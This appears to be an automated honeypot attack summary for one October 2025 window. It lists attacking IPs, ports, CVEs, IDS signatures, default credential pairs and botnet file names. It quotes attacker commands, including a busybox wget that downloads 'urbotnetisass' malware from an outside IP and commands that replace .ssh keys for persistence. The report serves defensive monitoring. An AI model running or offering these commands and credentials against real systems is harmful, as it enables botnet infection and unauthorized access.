
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-12T08:01:27Z
**Timeframe:** 2025-10-12T07:20:01Z to 2025-10-12T08:00:01Z
**Files Used:**
- agg_log_20251012T072001Z.json
- agg_log_20251012T074001Z.json
- agg_log_20251012T080001Z.json

## Executive Summary
This report summarizes 29,993 events collected from the honeypot network. The majority of attacks were captured by the Dionaea, Honeytrap, and Cowrie honeypots. The most targeted services were SMB (445) and a high port (5038). A significant number of attacks originated from IP address 122.121.74.82. Several CVEs were observed, and attackers attempted a variety of commands, including efforts to install malware and secure their access by adding SSH keys.

## Detailed Analysis

### Attacks by Honeypot
- Dionaea
- Honeytrap
- Cowrie
- Suricata
- Ciscoasa
- Sentrypeer
- Mailoney
- ConPot
- H0neytr4p
- Tanner
- Redishoneypot
- Ipphoney
- Adbhoney
- Honeyaml
- Miniprint
- ElasticPot

### Top Attacking IPs
- 122.121.74.82
- 173.239.216.40
- 49.247.47.230
- 88.214.50.58
- 45.128.199.212
- 143.244.130.157
- 103.26.136.173
- 43.229.78.35
- 62.141.43.183
- 27.112.78.223

### Top Targeted Ports/Protocols
- 445
- 5038
- 5060
- 22
- TCP/21
- 5903
- 25
- 21
- 8333
- 5908

### Most Common CVEs
- CVE-2019-11500
- CVE-2021-35394
- CVE-2005-4050
- CVE-2022-27255

### Commands Attempted by Attackers
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- cat /proc/cpuinfo | grep name | wc -l
- Enter new UNIX password:
- uname -s -v -n -r -m
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- w
- uname -m

### Signatures Triggered
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET DROP Dshield Block Listed Source group 1
- ET HUNTING RDP Authentication Bypass Attempt
- ET SCAN NMAP -sS window 1024
- ET FTP FTP PWD command attempt without login
- ET FTP FTP CWD command attempt without login
- ET INFO Reserved Internal IP Traffic
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication

### Users / Login Attempts
- cron/
- test/password@123
- 11111111/11111111
- pi/raspberrypi
- root/theciscoguys
- 345gs5662d34/345gs5662d34
- root/S0l3rp4n4leS2019
- operator/operator1
- root/admmn
- root/vizxv

### Files Uploaded/Downloaded
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass

### HTTP User-Agents
- No user agents were logged in this period.

### SSH Clients
- No SSH clients were logged in this period.

### SSH Servers
- No SSH servers were logged in this period.

### Top Attacker AS Organizations
- No AS organizations were logged in this period.

## Key Observations and Anomalies
- The command `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...` indicates a clear attempt to download and execute malware targeting various architectures.
- The repeated use of commands to remove and replace `.ssh/authorized_keys` suggests attackers are attempting to maintain persistent access to compromised systems.
- The high volume of traffic to port 445 (SMB) from a single IP address (122.121.74.82) is a strong indicator of a targeted scan or exploit attempt against that service.
